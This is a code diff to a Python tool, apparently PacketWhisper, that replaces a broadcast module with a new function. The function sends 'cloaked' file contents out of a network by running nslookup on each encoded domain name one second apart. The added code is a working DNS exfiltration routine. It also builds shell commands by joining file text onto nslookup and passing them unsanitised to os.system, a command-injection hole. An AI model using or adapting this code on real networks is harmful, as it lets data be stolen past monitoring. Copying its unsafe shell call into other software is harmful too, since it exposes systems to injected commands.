@@ -55,7 +55,7 @@
 #   $ python packetWhisper.py 
 # 
 
-import os, sys, getopt, socket, random, datetime, cloakify, decloakify, packetWhisperBroadcast
+import os, sys, getopt, socket, random, datetime, cloakify, decloakify
 
 # Set name of knock sequence string (this is only used when transmitting Common FQDN ciphers)
 
@@ -444,8 +444,7 @@ def SelectAndGenerateCommonWebsiteFQDNs( sourceFile, cloakedFile ):
 #
 # TransferCloakedFile( cloakedFile )
 #
-# Calls packetWhisperBroadcast.PacketWhisperBroadcast() to submit sequential
-# DNS queries for each FQDN in the Cloaked file.
+# Generates sequential DNS queries for each FQDN in the Cloaked file.
 #
 # Adds UTC datetimestamps before and after completion, can help identify
 # where in the pcap to look for info if you're capturing large volumes of
@@ -463,7 +462,7 @@ def TransferCloakedFile( cloakedFile ):
 	print "### Starting Time (UTC): " + mDateTimeUTC.strftime( "%x %X" )
 	print ""
 
-	status = packetWhisperBroadcast.PacketWhisperBroadcast( cloakedFile )
+	GenerateDNSQueries( cloakedFile )
 
 	mDateTimeUTC = datetime.datetime.utcnow()
 
@@ -479,6 +478,42 @@ def TransferCloakedFile( cloakedFile ):
 		print "File transfer failed."
 
 	print ""
+
+	return
+
+
+
+#========================================================================
+#
+# GenerateDNSQueries( cloakedFile )
+#
+#
+#
+#========================================================================
+
+def GenerateDNSQueries( cloakedFile ):
+
+	tmpAddrStr = ""
+
+	with open( cloakedFile, 'r' ) as fqdnFile:
+
+		#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    		for fqdn in fqdnFile:
+
+			fqdnStr = fqdn.strip()
+			
+			# Debug
+			# print fqdnStr
+
+			try:
+				commandStr = "nslookup " + fqdnStr
+				os.system( commandStr )
+
+				os.system( "sleep 1" )
+		
+			except:
+				os.system( "sleep 1" )
 
 	return
 
